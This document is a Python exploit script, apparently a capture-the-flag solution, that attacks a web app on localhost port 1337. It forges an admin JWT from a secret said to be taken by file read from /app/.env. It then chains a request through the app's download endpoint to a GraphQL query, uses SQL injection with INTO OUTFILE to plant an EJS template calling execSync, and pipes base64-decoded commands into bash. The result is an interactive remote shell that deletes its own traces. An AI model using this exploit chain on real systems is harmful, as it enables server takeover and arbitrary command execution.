import jwt
from requests import get, post
from base64 import b64encode
from urllib.parse import quote

# Key obtained from LFR within /app/.env
secret = "Str0ng_K3y_N0_l3ak_pl3ase?"
host = "127.0.0.1"
port = 1337

def generateToken(key):
    payload = { "role": "admin" }
    token = jwt.encode({**payload}, key, algorithm="HS256")
    return token


def writeFile(token, command):
    template_file = "/app/views/errors/404.ejs"

    # base64 encoding to avoid url format issue within graphql
    # deleting file after execution since mysql can only write into non-existing filename
    command = f"echo {quote(b64encode(command.encode()).decode())} | base64 -d | bash; rm {template_file}"

    url = f"http://{host}:{port}/download?token={token}"

    # SQL Injection Bypass using newline character
    # Used to write file into non-existent template
    payload = f"a\\n' union select '','<%= process.mainModule.require(\\\"child_process\\\").execSync(\\\"{command}\\\") %>','','' into outfile '{template_file}'-- -"

    data = {"url": f"http://localhost:1337/graphql?token={token}&query={{getDataByName(name:\"{payload}\"){{id}}}}"}

    post(url, data=data)

def execute(command):
    url = f"http://{host}:{port}/nonexistent"

    token = generateToken(secret)
    writeFile(token, command)

    # Trigger command execution from 404.ejs
    r = get(url)
    print(r.text.strip())

while True:
    execute(input("Execute command: "))